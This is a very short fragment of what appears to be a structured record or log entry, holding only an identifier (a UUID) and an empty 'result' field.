Id: c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
   result:
